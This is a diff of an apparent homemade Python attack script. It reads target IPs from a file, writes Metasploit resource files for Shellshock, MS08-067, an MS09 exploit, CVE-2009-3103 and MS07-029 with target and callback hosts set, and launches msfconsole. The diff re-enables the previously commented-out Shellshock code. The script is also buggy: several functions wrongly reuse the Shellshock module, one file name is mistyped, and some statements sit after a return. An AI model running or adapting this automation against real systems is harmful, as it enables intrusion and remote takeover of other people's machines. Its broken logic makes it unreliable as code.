@@ -23,10 +23,7 @@ print target_file
 def shell_shock(hosts): #name of function and host defined
  with open('ip.txt', 'rb') as fp:
   hosts = fp.read()[:+12]
- 
- 
- 
-  '''os.system('touch /Desktop custom_shock.rc') # makes file with bash command
+  os.system('touch /Desktop custom_shock.rc') # makes file with bash command
   os.system('use exploit/multi/http/apache_mod_cgi_bash_env_exec > custom_shock.rc') #metasploit script shit
   os.system('echo set RHOST '+ hosts +' >> custom_shock.rc')
   os.system('echo set TARGETURI cgi/bin >> custom_shock.rc')
@@ -34,8 +31,6 @@ def shell_shock(hosts): #name of function and host defined
   os.system('echo set LHOST ' + Our_IP + ' >>  custom_shock.rc')
   os.system('echo set ConnectTimeout 30 >> custom_shock.rc')
   os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> custom_shock.rc')
- 
-#stopps working form here
   os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> custom_shock.rc')
   #os.system('echo exit  >> custom_shock.rc')
   #os.system('/usr/share/metasploit-framework/modules/ sudo msfconsole -r custom_shock.rc')
@@ -44,10 +39,7 @@ def shell_shock(hosts): #name of function and host defined
   return hosts
   host = true
   Host_is_set = True;
-##make exploit script:
-'''
- 
-'''
+
 def MS08_067(hosts):
   with open('ip.txt', 'rb') as fp:
     hosts = fp.read()[:+13] 
@@ -62,7 +54,7 @@ def MS08_067(hosts):
     os.system('sudo msfconsole -r MS08_067.rc')
 
     return hosts
-  '''
+  
 def ms09(hosts):
   with open('ip.txt', 'rb') as fp:
     hosts = fp.read()[:+13] 
@@ -79,11 +71,6 @@ def ms09(hosts):
 
     return hosts
 	
-
-
-
-
-
 def CVE_2009_3103(hosts): #name of function and host defined
  with open('ip.txt', 'rb') as fp:
   hosts = fp.read()[:+12]
@@ -96,8 +83,6 @@ def CVE_2009_3103(hosts): #name of function and host defined
   os.system('echo set LHOST ' + Our_IP + ' >>  CVE3103.rc.rc')
   os.system('echo set ConnectTimeout 30 >> CVE3103.rc')
   os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> CVE3103.rc')
- 
-#stopps working form here
   os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> CVE3103.rc')
   #os.system('echo exit  >> custom_shock.rc')
   #os.system('/usr/share/metasploit-framework/modules/ sudo msfconsole -r custom_shock.rc')
@@ -119,7 +104,6 @@ def MS07_029(hosts): #name of function and host defined
   os.system('echo set LHOST ' + Our_IP + ' >>  MS029.rc')
   os.system('echo set ConnectTimeout 30 >> MS029.rc')
   os.system('echo set AutoRunScript multi_console_command -rc ' + working_dir + '  >> MS029.rc')
-#stopps working form here
   os.system('echo use exploit/multi/http/apache_mod_cgi_bash_env_exec  -r >> MS029.rc')
   #os.system('echo exit  >> custom_shock.rc')
   #os.system('/usr/share/metasploit-framework/modules/ sudo msfconsole -r custom_shock.rc')
